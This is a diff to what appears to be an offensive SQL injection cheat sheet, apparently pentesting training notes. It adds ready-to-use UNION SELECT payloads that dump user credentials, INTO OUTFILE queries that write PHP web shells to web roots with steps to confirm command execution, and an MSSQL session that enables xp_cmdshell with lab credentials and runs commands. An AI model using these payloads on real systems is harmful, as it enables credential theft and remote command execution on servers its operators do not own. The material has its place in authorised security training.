@@ -123,6 +123,30 @@ Even though GROUP BY and ORDER BY have different functionality in SQL, they both
 ' union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'  // Fetch Column names from Table
 ' UNION SELECT 1,group_concat(user,0x3a,pasword),3 from users limit 0,1-- -  // Dump data from Columns using 0x3a as seperator
 ' union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'   // Backdoor
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // Write a WebShell To Disk via INTO OUTFILE directive. 192.168.191.x/tmp/webshell.php?cmd=ls
+
+Although the various MySQL database variants don't offer a single function to escalate to RCE, we can abuse the SELECT INTO_OUTFILE statement to write files on the web server.
+For this attack to work, the file location (var/www/html/tmp/webshell.php) must be writable to the OS user running the database software.
+
+We'll issue the UNION SELECT SQL keywords to include a single PHP line into the first column and save it as webshell.php in a writable web folder.
+Write a WebShell To Disk via INTO OUTFILE directive:
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+The written PHP code file results in the following:
+<? system($_REQUEST['cmd']); ?>
+PHP reverse shell
+
+The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.
+If we try to use the above payload inside the Lookup field of the search.php endpoint, we receive the following error:
+
+Fortunately, this error is related to the incorrect return type, and should not impact writing the webshell on disk.
+To confirm, we can access the newly created webshell inside the tmp folder along with the id command.
+
+192.168.191.x/tmp/webshell.php?cmd=ls
+
+The webshell is working as expected, since the output of the id command is returned to us through the web browser. 
+We discovered that we are executing commands as the www-data user, an identity commonly associated with web servers on Linux systems.
+
 ```
 
 # Post-Methods
@@ -237,7 +261,36 @@ Even though GROUP BY and ORDER BY have different functionality in SQL, they both
       PostgreSQL 	  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
       
       MySQL 	      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
-```      
+```
+
+# MSSQL
+```
+Connect and Enable xp_cmdshell:
+kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+
+Enabling xp_cmdshell feature
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE;
+
+After logging in from our Kali VM to the MSSQL instance, we can enable show advanced options by setting its value to 1, then applying the changes to the running configuration via the RECONFIGURE statement. 
+Next, we'll enable xp_cmdshell and apply the configuration again using RECONFIGURE.
+With this feature enabled, we can execute any Windows shell command through the EXECUTE statement followed by the feature name.
+Executing Commands via xp_cmdshell:
+
+SQL> EXECUTE xp_cmdshell 'whoami';
+output
+nt service\mssql$sqlexpress
+NULL
+```
+
+
+
+
 # Resources and tools that will help gain an upper hand on finding bugs :
 * Portswigger SQL Injection cheat sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet
 * HTTPX - https://github.com/encode/httpx
